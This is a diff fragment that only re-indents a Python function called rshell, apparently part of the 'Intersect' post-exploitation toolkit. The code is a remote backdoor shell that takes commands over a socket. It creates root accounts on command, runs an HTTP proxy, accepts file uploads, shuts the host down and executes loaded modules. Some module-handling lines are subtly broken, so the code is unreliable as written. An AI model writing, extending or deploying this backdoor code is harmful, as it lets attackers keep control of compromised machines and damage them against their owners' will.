@@ -22,13 +22,13 @@ def rshell():
              )
         stdout, stderr = proc.communicate()
         if cmd.startswith('cd'):
-	    destination = cmd[3:].replace('\n','')
+            destination = cmd[3:].replace('\n','')
             if os.path.isdir(destination):
-	        os.chdir(destination)
-	        conn.send("\nIntersect "+str(os.getcwd())+" => ")
+                os.chdir(destination)
+                conn.send("\nIntersect "+str(os.getcwd())+" => ")
             else:
-	        conn.send("[!] Directory does not exist") 
-	        conn.send("\nIntersect "+str(os.getcwd())+" => ")
+                conn.send("[!] Directory does not exist") 
+                conn.send("\nIntersect "+str(os.getcwd())+" => ")
 
         elif cmd.startswith('adduser'):
             strip = cmd.split(" ")
@@ -37,9 +37,9 @@ def rshell():
             conn.send("[+] Root account " + acct + " has been created.")
 
         elif cmd == ("httproxy"):
-	    httpd = SocketServer.ForkingTCPServer(('', PPORT), Proxy)
+            httpd = SocketServer.ForkingTCPServer(('', PPORT), Proxy)
             conn.send("[+] Serving HTTP proxy on port %s" % PPORT)
-	    httpd.serve_forever()  
+            httpd.serve_forever()  
 
         elif cmd.startswith('upload'):
             getname = cmd.split(" ")
@@ -69,17 +69,17 @@ def rshell():
             conn.send("[!] Server system is going down for a reboot!")
             os.system("shutdown -h now")
 
-	elif cmd == ("extask"):
+        elif cmd == ("extask"):
             conn.send(str(modList))
-	    conn.send("\nIntersect "+str(os.getcwd())+" => ")
+            conn.send("\nIntersect "+str(os.getcwd())+" => ")
 
-	elif cmd.startswith("extask"):
+        elif cmd.startswith("extask"):
             getname = cmd.split(" ")
             modname = getname[1]
             if modname in modList is False:
                 conn.send("[!] Module not loaded!")
             else:
-		conn.send("[+] Executing %s " % modname)
+                conn.send("[+] Executing %s " % modname)
                 execmod = modname+"()"
                 execmod
 
